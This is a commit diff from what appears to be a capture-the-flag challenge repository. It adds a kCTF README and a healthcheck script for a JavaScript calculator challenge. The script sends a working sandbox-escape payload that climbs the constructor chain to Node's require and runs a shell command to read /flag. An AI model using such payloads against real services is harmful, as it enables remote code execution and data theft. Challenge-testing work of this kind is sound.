9859fcbfc7317ecd1a7924bb2f201cae99828451
sera <j.a.nzc0@gmail.com>
2022-12-21 21:45:15 -0800

    First commit; add kctl and challenge metacalc

---
+++ README.md
@@ -0,0 +1,14 @@
+# irisctf 2023 challenge repo
+
+kCTF walkthrough:
+https://google.github.io/kctf/local-testing.html
+
+To activate the kCTF environment:
+```sh
+source kctf/activate
+```
+
+To make a challenge:
+```sh
+kctf chal create NAME && cd NAME
+```
---
+++ metacalc/healthcheck/healthcheck.py
@@ -0,0 +1,40 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# Copyright 2020 Google LLC
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     https://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+
+import pwnlib.tubes
+
+def handle_pow(r):
+    print(r.recvuntil(b'python3 '))
+    print(r.recvuntil(b' solve '))
+    challenge = r.recvline().decode('ascii').strip()
+    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
+    solution = p.readall().strip()
+    r.sendline(solution)
+    print(r.recvuntil(b'Correct\n'))
+
+r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
+print(r.recvuntil('== proof-of-work: '))
+if r.recvline().startswith(b'enabled'):
+    handle_pow(r)
+
+SOLUTION = """=(function(){({}).constructor.defineProperty(Math, "a", {get: function() {const require = this.constructor.constructor('return process.mainModule.require')(); const flag = require('child_process').execSync('cat /flag').toString(); require('console').log(flag); return 1}})})()||Math.a""".encode()
+
+r.sendline(SOLUTION)
+
+print(r.recvuntil(b'irisctf{'))
+print(r.recvuntil(b'}'))
+
+exit(0)
